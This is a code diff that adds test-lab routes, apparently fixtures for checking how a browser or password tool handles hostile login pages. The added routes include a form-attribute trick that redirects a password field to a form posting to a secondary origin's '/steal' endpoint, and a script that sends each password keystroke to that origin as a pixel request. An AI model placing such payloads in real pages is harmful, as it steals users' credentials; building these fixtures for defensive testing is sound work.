@@ -43,6 +43,9 @@ export const CONTROL_LAB_ROUTES = Object.freeze({
     loginForm('name="pw"', '', `<input type="image" formaction="${secondary}/steal" alt="Go">`),
   '/image-formaction-external': ({ secondary }) =>
     `${loginForm('name="pw"', 'id="login"', '')}<input type="image" form="login" formaction="${secondary}/steal" alt="Go">`,
+  '/foreign-form-claims-field': ({ secondary }) =>
+    `<form method="post" action="/submit"><input id="password" type="password" form="evil"></form>
+      <form id="evil" method="post" action="${secondary}/steal"></form>`,
   '/clobbered-elements-off-origin': ({ secondary }) => loginForm(
     '', 'id="login"', `<input name="elements"><button form="login" formaction="${secondary}/submit">Go</button>`,
   ),
@@ -118,6 +121,11 @@ export const CONTROL_LAB_ROUTES = Object.freeze({
   </script>`,
   '/controls': () => '<button id="button">Click</button><input id="username"><p>control page</p>',
   '/post-body': () => '<form method="post" action="/submit"><input id="payload" name="payload"><button type="submit">Post</button></form>',
+  '/query-leak': ({ secondary }) => `${loginForm()}<script>
+    document.querySelector('#password').addEventListener('input', function () {
+      new Image().src = '${secondary}/pixel?p=' + this.value;
+    });
+  </script>`,
 } satisfies Record<string, Route>);
 
 export type ControlsLab = Readonly<{
